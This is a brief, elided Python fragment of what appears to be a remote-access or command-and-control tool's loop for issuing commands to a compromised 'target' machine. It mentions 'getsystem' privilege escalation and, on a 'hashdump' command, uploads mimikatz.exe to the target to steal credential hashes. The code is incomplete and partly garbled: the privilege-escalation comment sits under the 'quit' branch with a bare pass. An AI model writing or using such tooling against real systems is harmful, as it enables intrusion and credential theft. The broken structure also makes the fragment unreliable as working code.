...
def target_communication():
    while True:
        ...
        if command == 'quit':
            ...
            # If the user enters 'getsystem', do the privilege escalation.
            pass
        elif command == 'hashdump':
            # If the user enters 'hashdump', upload the mimikatz.exe file to the target.
            upload_file('mimikatz.exe')
